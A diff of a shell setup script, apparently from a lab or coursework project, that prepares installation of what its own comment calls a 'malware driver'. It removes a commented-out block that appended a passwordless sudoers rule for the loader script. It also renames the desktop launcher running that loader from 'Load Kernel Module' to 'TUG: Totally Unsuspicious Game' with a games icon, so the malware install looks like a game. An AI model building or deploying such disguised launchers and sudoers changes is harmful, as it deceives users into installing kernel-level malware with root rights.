@@ -38,24 +38,6 @@ else
     echo "NOPASSWD rule already exists."
 fi
 
-#USER="tony"
-#RELATIVE_SCRIPT_PATH="./driver/load.sh"
-#chmod +x "$RELATIVE_SCRIPT_PATH"
-#SCRIPT_PATH=$(realpath "$RELATIVE_SCRIPT_PATH")
-#DESKTOP_ICON_PATH="/home/$USER/Desktop/LoadKernelModule.desktop"
-
-# Check if the line already exists in sudoers file.
-# If it does not, then add it.
-#if ! grep -q "$USER ALL=(ALL) NOPASSWD: $SCRIPT_PATH" /etc/sudoers; then
-    # Append the necessary line to sudoers file using tee for safe editing
-#    echo "$USER ALL=(ALL) NOPASSWD: $SCRIPT_PATH" | tee -a /etc/sudoers > /dev/null
-#    echo "Sudoers file updated successfully."
-#else
-#    echo "Sudoers file already contains the necessary entry."
-#fi
-
-
-
 ######################################################################################################
 
 # Step 3: Create a desktop icon which will run a script to install the malware driver
@@ -67,10 +49,10 @@ DESKTOP_ICON_PATH="/home/$USER/Desktop/LoadKernelModule.desktop"
 
 DESKTOP_CONTENT="[Desktop Entry]
 Version=1.0
-Name=Load Kernel Module
-Comment=Click to load the kernel module
+Name=TUG: Totally Unsuspicious Game
+Comment=Click to launch TUG!
 Exec=$SCRIPT_PATH
-Icon=utilities-terminal
+Icon=applications-games
 Terminal=false
 Type=Application
 Categories=Utility;"
